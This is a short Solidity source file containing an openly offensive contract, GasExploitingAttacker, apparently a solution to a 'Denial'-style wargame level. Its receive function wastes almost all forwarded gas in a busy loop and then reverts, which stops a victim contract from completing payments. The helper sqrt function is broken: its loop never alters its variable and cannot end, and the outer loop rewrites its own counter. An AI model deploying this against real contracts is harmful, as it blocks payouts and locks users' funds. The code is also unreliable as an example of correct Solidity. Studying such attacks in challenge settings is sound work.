// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GasExploitingAttacker {
    address public denial;
    
    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        uint256 gasRemaining = gasleft();
        if (gasRemaining > 10000) {
            // Use up all available gas before revert
            while (gasleft() > 10000) {
                // Consume gas with expensive operations
                for (uint i = 0; i < 100; i++) {
                    i *= i;
                    i = sqrt(i);
                }
            }
            revert();
        }
    }

    function sqrt(uint256 x) private pure returns (uint256 y) {
        y = 0;
        if (x >= 1) {
            uint256 b = 1 << 208;
            while (b != 0) {
                uint256 bBittest = x / b;
                if (((bBittest != 0) && bBittest < 0x100000000000000000) || bBittest == 0)
                assembly {
                    y := add(
                        y, 
                        div(
                            mul(y, 0x100000000000000000),
                            b
                        )
                    )
                }
            }
        }
    }
}
